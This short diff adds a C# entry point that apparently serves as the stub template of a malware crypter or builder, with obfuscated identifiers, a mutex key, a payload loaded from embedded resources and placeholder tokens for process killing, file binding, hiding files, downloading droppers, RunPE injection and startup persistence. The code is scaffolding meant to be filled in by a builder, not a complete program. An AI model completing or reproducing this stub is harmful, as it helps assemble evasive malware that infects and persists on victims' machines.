@@ -1,0 +1,24 @@
+static void Main()
+        {		
+        try
+        {	
+		AA2dBBbBB3("[MUTEXTKEY]");
+		[PROCKILL]		
+		[BIND-DROP1] 
+		[BATCH1]
+		[BATCH2]		
+		[ACTIVEXSTART]
+		[HIDEFILE]		
+		[DOWNLOAD-DROP1]		
+		[YES]
+	    [DROPLOADER]		
+        byte[] KKKKK1 = (byte[])JJ9.GetObject("[RESNAMESTRING]");
+		[DOTNETORNOT]
+		[RUNPE-CALL]	
+		[STARTUP]
+        [DOWNLOAD-DROP]
+        [BIND-DROP2]        
+		
+        }
+        catch(Exception ex) {MessageBox.Show(ex.ToString()); }
+        }
